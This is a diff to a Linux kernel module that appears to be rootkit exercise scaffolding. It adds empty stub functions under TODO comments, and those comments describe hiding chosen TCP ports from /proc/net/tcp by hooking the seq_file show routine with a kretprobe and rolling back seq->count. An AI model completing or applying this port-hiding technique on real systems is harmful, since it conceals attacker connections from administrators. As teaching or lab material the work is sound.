@@ -27,10 +27,20 @@ static struct rk_target_list port_targets;
 /* TODO: Implement rk_target_add(list, name)
  * spin_lock_irqsave, check count < max, strscpy, count++, spin_unlock_irqrestore
  */
+static int rk_target_add(struct rk_target_list *list, const char *name)
+{
+	/* TODO: implement */
+	return -ENOSYS;
+}
 
 /* TODO: Implement rk_target_remove(list, idx)
  * spin_lock_irqsave, validate idx, memmove to close gap, count--, spin_unlock_irqrestore
  */
+static int rk_target_remove(struct rk_target_list *list, int idx)
+{
+	/* TODO: implement */
+	return -ENOSYS;
+}
 
 /* TODO: Implement rk_target_match(list, name)
  * spin_lock_irqsave, iterate and strcmp, return true/false, spin_unlock_irqrestore
@@ -49,6 +59,11 @@ struct tcp_show_data {
  * Get seq_file pointer from regs->di, save seq->count.
  * Get sock pointer from regs->si, save it.
  */
+static int tcp_show_entry(struct kretprobe_instance *ri, struct pt_regs *regs)
+{
+	/* TODO: implement */
+	return 0;
+}
 
 /* TODO: Implement tcp_show_return(ri, regs)
  * If sk == SEQ_START_TOKEN, skip (this is the header row).
@@ -57,6 +72,11 @@ struct tcp_show_data {
  * Convert port to string with snprintf.
  * If rk_target_match finds the port: restore seq->count to saved value.
  */
+static int tcp_show_return(struct kretprobe_instance *ri, struct pt_regs *regs)
+{
+	/* TODO: implement */
+	return 0;
+}
 
 static struct kretprobe tcp4_probe = {
 	.handler        = tcp_show_return,
